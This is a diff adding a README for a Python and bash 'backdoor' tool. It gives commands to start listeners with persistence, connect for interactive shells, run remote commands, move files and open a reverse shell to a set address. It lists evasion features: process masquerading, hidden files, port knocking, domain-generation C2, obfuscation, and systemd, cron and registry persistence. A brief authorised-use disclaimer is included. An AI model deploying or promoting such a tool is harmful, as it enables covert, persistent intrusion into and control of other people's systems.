@@ -1,0 +1,169 @@
+Setup & Usage Instructions:
+Python Backdoor:
+Install dependencies:
+
+bash
+pip install cryptography aiofiles psutil
+Generate SSL certificates (optional):
+
+bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+Start server:
+
+bash
+# Basic server
+python3 backdoor.py --server --port 4433
+
+# With SSL
+python3 backdoor.py --server --ssl-cert cert.pem --ssl-key key.pem
+
+# With persistence
+python3 backdoor.py --server --persistent
+
+# Save the generated key for client connections
+Connect as client:
+
+bash
+# Interactive mode
+python3 backdoor.py --client --host 192.168.1.100 --port 4433 --key <key>
+
+# Execute single command
+python3 backdoor.py --client --host 192.168.1.100 --command "uname -a"
+
+# Start interactive shell
+python3 backdoor.py --client --host 192.168.1.100 --shell
+
+# Upload file
+python3 backdoor.py --client --host 192.168.1.100 --upload local.txt remote.txt
+
+# Download file
+python3 backdoor.py --client --host 192.168.1.100 --download remote.txt local.txt
+Shell Backdoor:
+Make executable:
+
+bash
+chmod +x backdoor.sh
+Start server:
+
+bash
+# Basic server
+./backdoor.sh --server
+
+# Custom port
+PORT=5555 ./backdoor.sh --server
+
+# With stealth
+STEALTH_MODE=true ./backdoor.sh --server
+Connect as client:
+
+bash
+# Interactive client
+./backdoor.sh --client 192.168.1.100
+
+# Reverse shell
+./backdoor.sh --reverse 192.168.1.100 4444
+
+# Port knocking detection
+./backdoor.sh --knock
+Key Features:
+Python Backdoor:
+Encryption: AES-256 encryption with Fernet
+
+SSL/TLS Support: Secure communication with certificates
+
+Asynchronous: High-performance async I/O
+
+Stealth: Process name randomization, logging
+
+Persistence: Systemd service, Windows registry
+
+File Transfer: Encrypted upload/download
+
+Interactive Shell: Full shell access
+
+Authentication: Challenge-response authentication
+
+Heartbeat: Keep-alive mechanism
+
+Multi-threading: Handle multiple clients
+
+Shell Backdoor:
+Lightweight: Pure bash, no dependencies
+
+Encryption: OpenSSL AES-256 encryption
+
+Stealth: Random process names, hidden files
+
+Persistence: Systemd, cron, rc.local
+
+Port Knocking: Covert connection initiation
+
+Reverse Shell: Outbound connections
+
+File Operations: Secure file transfer
+
+System Info: Detailed system enumeration
+
+Sandboxing: Safe command execution
+
+Logging: Encrypted activity logs
+
+Security Features:
+Command Validation: Block dangerous commands
+
+Rate Limiting: Prevent DoS attacks
+
+Session Management: Timeout inactive sessions
+
+Input Sanitization: Prevent injection attacks
+
+Error Handling: Silent failure modes
+
+Resource Limits: Prevent resource exhaustion
+
+Detection Avoidance:
+Random Ports: Dynamic port selection
+
+Process Hiding: Renamed processes
+
+Encrypted Logs: Stealthy logging
+
+Minimal Footprint: Low resource usage
+
+Legitimate Names: Masquerade as system processes
+
+Legal & Ethical Notes:
+
+###IMPORTANT WARNING###
+
+Use only on systems you own or have explicit written permission to test
+
+Follow all applicable laws and regulations
+
+Obtain proper authorization before testing
+
+Use only for educational purposes or authorized penetration testing
+
+Do not use for illegal activities
+
+Advanced Features:
+Port Hopping: Change ports periodically
+
+Domain Generation: Dynamic C2 communication
+
+Code Obfuscation: Anti-analysis techniques
+
+Persistence Mechanisms: Multiple fallback methods
+
+Network Evasion: Tunneling through legitimate services
+
+Usage Scenarios:
+Authorized Penetration Testing: Test security controls
+
+Red Team Exercises: Simulate adversary activities
+
+Security Training: Educational demonstrations
+
+Incident Response: Remote access for investigation
+
+System Administration: Remote management (with proper controls)
